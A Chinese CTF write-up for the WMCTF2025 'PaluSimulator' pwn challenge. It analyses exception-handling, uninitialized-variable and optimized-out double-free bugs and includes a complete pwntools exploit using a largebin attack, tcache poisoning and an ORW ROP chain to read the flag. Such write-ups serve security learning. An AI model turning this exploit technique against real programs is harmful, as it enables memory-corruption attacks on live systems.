# PaluSimulator

## 题目简述

题目是一个静态链接的 C++ 菜单程序，附件给出远程部署环境：Ubuntu 22.04 容器、xinetd 暴露 9999、程序 `pwn`、对应 `ld-linux-x86-64.so.2` 和 `libc.so.6`。源码外链给出的关键结构是循环处理 TodoList：输入 size、申请缓冲区、读入内容、输出内容并释放。程序对负数 size、异常处理和对象析构的组合处理不当，导致泄露、double free、堆溢出和最终栈迁移 ROP。

源码链接的重要信息不只是编译文件本身：官方源码用 Ubuntu 25.04、GCC/G++ 14.2.0 和 `-O3 -static-libstdc++ -static-libgcc -s` 编译，很多局部变量没有初始化；异常处理捕获 `std::bad_alloc` 后没有立刻返回；析构中用于标记已释放的 `FREEDBUF` 写入在高优化下会被优化掉，使源码表面上的 double free 防护失效。

## 解题过程

### 编译环境

[SourceCode](https://github.com/0xAkyOI/WMCTF2025-PaluSimulator/blob/main/pwn.cpp)

On Ubuntu25.04

gcc version 14.2.0 (Ubuntu 14.2.0-19ubuntu2)

g++ -O3 -static-libstdc++ -static-libgcc -s pwn.cpp -o pwn

外链源码的可复现要点是：使用 Ubuntu 25.04、GCC/G++ 14.2.0，以 `-O3 -static-libstdc++ -static-libgcc -s` 编译。这个优化级别会影响析构函数中标志位写回，是漏洞能触发的重要前提。

### 漏洞分析

![分析](<WMCTF2025-palusimulator-wp/分析.png>)

![分析](<WMCTF2025-palusimulator-wp/分析-02.png>)

其实输入一个负数就能看到输出了std::bad_alloc，调试一下可以知道是存在异常处理了。
而且后面还会输出chunk的内容，原因就是异常处理没有return而是可以继续执行。
循环的函数的流程就是：
输入size->申请空间->写入内容->输出内容->释放空间。

申请chunk的时候检测如果申请的大小是8就会直接使用那个栈上指针进行存储，而不是通过new申请堆块了。

### 利用步骤

程序循环的函数中，很多变量都没有初始化，导致栈上残留的都是上一轮循环的变量。

程序触发异常的时候try catch处理异常没有直接return，而是允许继续执行，加上析构前free前使用std::fill用00清空chunk的数据，在栈上如果有残留被free的chunk的指针会构成tcache上的double free（总的流程就是free-fill00-free）。可以利用这个漏洞将tcache填满，溢出到其他bin里面。

有意思的是，在O3或者O2优化下，析构函数中```flags|=FREEDBUF;```操作会被优化掉，但是O1就不会，所以O2或者O3下FREEDBUF标志不会被设置，这也就是导致FREEDBUF这个用于防止double free检测无效的原因。所以程序源码在这里就有一些误导性。

这一点可以看下面这两张图，第一张是O1编译下demo的析构函数，第二张是O3编译下demo的析构函数：

![这一点可以看下面这两张图，第一张是O1编译下demo的析构函数，第二张是O3编译下demo的析构函数](<WMCTF2025-palusimulator-wp/这一点可以看下面这两张图-第一张是o1编译下demo的析构函数-第二张是o3编译下demo的析构函数.png>)

![这一点可以看下面这两张图，第一张是O1编译下demo的析构函数，第二张是O3编译下demo的析构函数](<WMCTF2025-palusimulator-wp/这一点可以看下面这两张图-第一张是o1编译下demo的析构函数-第二张是o3编译下demo的析构函数-04.png>)

触发异常只需要size为负数即可。(这个异常处理的逻辑是在0x18EB6)

![触发异常只需要size为负数即可。(这个异常处理的逻辑是在0x18EB6](<WMCTF2025-palusimulator-wp/触发异常只需要size为负数即可-这个异常处理的逻辑是在0x18eb6.png>)

执行完对异常处理的chunk进行free操作后就跑到循环的函数里面继续执行下面的输出内容的操作了。

触发异常会申请一个0x90的chunk，里面有elf地址、heap地址、栈地址（正好是栈顶），这个chunk在异常处理结束后会被free，利用上面异常处理没有直接return的漏洞可以泄漏这个chunk的内容，拿到elf地址、栈地址等。

程序看似限制申请 chunk 的大小，实际上因为负数漏洞存在，某些负数乘 8 后会发生整数溢出并得到较大的正数。例如 `size_t((0x8000000000000000 + 0x400 / 8) * 8) = 0x400`，从而实现任意 size 的 chunk 申请。

如果read函数第三个参数初始化是一个很小的数值，而且后续还会和size去min，不足以溢出，没有办法在tcache原本存在chunk的情况下获得任意地址申请，因此要想办法构造堆溢出。
现在已有的堆溢出就是：如果0x90的tcache存储的是一个小chunk，比如0x30，在异常处理的时候就会写入多余0x30的东西，导致堆溢出。

选择largebin attack劫持“Hack”选项调用的read函数的第三个参数，进行堆溢出写：

先用 0x90 的堆块填满对应 tcache，使多余 chunk 进入 unsorted bin；再对这个 0x90 chunk 进行切割，让实际进入 0x90 tcache 的堆块变小。这样异常处理堆块里的栈地址会落在剩余 chunk 的 `bk_nextsize` 附近，而栈顶 `+0x20` 正好对应后续 `read` 函数第三个参数，劫持它即可实现堆溢出写。

largebin attack写入用于read的栈上变量后，每次申请chunk都会对read的这个参数取min导致我们还需要一次负数的漏洞让这个变量大小仍然可以满足越界写。

之后劫持tcache fd即可写栈劫持没有canary的函数的返回地址(比如fread函数)进行ROP打ORW拿flag。

程序编译的时候把libstdc++和libgcc编译进来了，就有了很多好用的gadget，ORW的函数也不需要到libc找了，ELF中就有，方便写ROP。

`exp.py` 外链的核心流程已经体现在下方脚本中：先用负数触发异常泄露 ELF、heap 和 stack 地址；再通过多轮申请/释放布置 tcache、unsorted bin 和 largebin；利用 largebin attack 写栈上的 `read` 参数；随后用负数 size 维持越界写条件，覆盖 tcache fd 指向栈地址，最后在无 canary 的调用链返回地址处布置 ORW ROP。

```python
from pwn import*
from Crypto.Util.number import long_to_bytes,bytes_to_long

context.log_level='debug'
context(arch='amd64',os='linux')
context.terminal=['tmux','splitw','-h']

ELFpath = './pwn'
p=process(ELFpath)

rut=lambda s :p.recvuntil(s,timeout=0.3)
ru=lambda s :p.recvuntil(s)
r=lambda n :p.recv(n)
sl=lambda s :p.sendline(s)
sls=lambda s :p.sendline(str(s))
sla=lambda con,s :p.sendlineafter(con,s)
sa=lambda con,s :p.sendafter(con,s)
ss=lambda s :p.send(str(s))
s=lambda s :p.send(s)
uu64=lambda data :u64(data.ljust(8,'\x00'))
it=lambda :p.interactive()
b=lambda :gdb.attach(p)
bp=lambda bkp:gdb.attach(p,'b *'+str(bkp))
get_leaked_libc = lambda :u64(ru(b'\x7f')[-6:].ljust(8,b'\x00'))

def ptrxor(pos,ptr):
    return p64((pos >> 12) ^ ptr)
scr='''
b *(&fread+238)
'''
def add(size,con=b'a'):
    if size==-1:
        p.sendlineafter("How many affairs :","-1")
        return
    con=b'\xde'*((size*8)&0xffffffffffffffff-1)
    print(hex((size*8)&0xffffffffffffffff))
    print(hex((size*8)))

    p.sendlineafter("How many affairs :",str(size))
    p.sendlineafter("TodoList :",con)
def addvul(size,con):
    if size==-1:
        p.sendlineafter("How many affairs :","-1")
        return
    print(hex((size*8)&0xffffffffffffffff))
    print(hex((size*8)))

    p.sendlineafter("How many affairs :",str(size))
    p.sendafter("TodoList :",con)

add(0x80//8)

add(-1)
p.recvuntil("Your TodoList: ")
p.recv(8)
p.recv(8)
p.recv(0x40)
elf_base=u64(p.recv(8))-0x5edae738feb6+0x5edae7377000
heap_base=u64(p.recv(8))-0x5e94c722b330+0x5e94c7219000
p.recv(0x8)
p.recv(0x10)
stk_addr=u64(p.recv(8))
import ctypes
def to_int64(x):
    return ctypes.c_longlong(x & 0xFFFFFFFFFFFFFFFF).value
for i in range(5):
    add(-1)

add(0x210//8)
add(0x1f0//8)
add(0xf0//8)

add(0x1e0//8)
add(0x250//8)

add(0xe0//8)
add(0xd0//8)
add(0xc0//8)

add(-1)

add(0x1e0//8)
for i in range(7):
    add(-1)

add(0x250//8)
for i in range(7):
    add(-1)

add(to_int64(0x8000000000000000+0x3f0//8))
for i in range(6):
    add(-1)


add(0x1f0//8)
for i in range(7):
    add(-1)

add(0x210//8)
for i in range(7):
    add(-1)

add(0x80//8)

add(-1)

add(0x58//8)
add(to_int64(0x8000000000000000+0x500//8))
add(to_int64(0x8000000000000000+0x3f0//8))

add(-1)

add(to_int64(0x8000000000000000+0x500//8))

payload=b'\x08'

addvul(to_int64(0x8000000000000000+0xd0//8),payload.ljust(0xd0-1))
hppld=b'a'*0xd8+p64(0x31)+ptrxor(heap_base-0x5be4dbfb3000+0x5be4dbfc5e78,stk_addr-0x70 )
p.sendlineafter("You realized that you must do something...",hppld)
add(0xc0//8)
rop=ROP(ELFpath)
pop_rdi=elf_base+rop.rdi.address
pop_rsi=elf_base+rop.rsi.address
mov_rdx_rdi=elf_base+0x07f096
elf=ELF(ELFpath)
elf.address=elf_base
open_addr=elf.sym["open"]
read_addr=elf.sym["read"]
write_addr=elf.sym["write"]
for x in elf.search("flag"):
    flag_str=x
    break
buf=heap_base+0x1000
payload=p64(pop_rdi)+p64(flag_str)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload+=p64(pop_rdi)+p64(0x100)+p64(mov_rdx_rdi)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(buf)+p64(read_addr)
payload+=p64(pop_rdi)+p64(1)+p64(write_addr)
addvul(0xc0//8,(b'a'*7+payload).ljust(0xc0-1))

print(hex(elf_base))
print(hex(stk_addr))

p.interactive()
```

但是这题也有非预期，比如read函数忘记检查buf是位于栈还是位于堆。这可以参考0xFFF的wp。

还有更简单的非预期：`read` 的 `nbytes` 初始值本身很大，题目中也没有初始化，导致可以一直使用负数维持溢出条件。`exp1.py` 外链体现的就是这条更短路线：直接利用泄露后的地址，溢出劫持 size 和 tcache fd，再申请到栈上布置 ROP。

## 方法总结

- 核心技巧：负数 size 触发异常后继续执行，结合未初始化局部变量和 `-O3` 下失效的释放标志，构造泄露、double free、堆溢出、largebin attack 和 tcache fd 劫持。
- 识别信号：C++ Pwn 中出现异常捕获后继续走原流程、析构清理逻辑、优化级别差异和局部变量未初始化时，应同时关注源码语义和实际汇编。
- 复用要点：源码里的防护标志不等于二进制里真的存在；静态链接会带来大量可用 gadget，ORW 可直接从 ELF 找 `open/read/write`。非预期路线通常来自未初始化 IO 长度或 buf 位置检查缺失，复盘时要把官方链和短链都记录清楚。
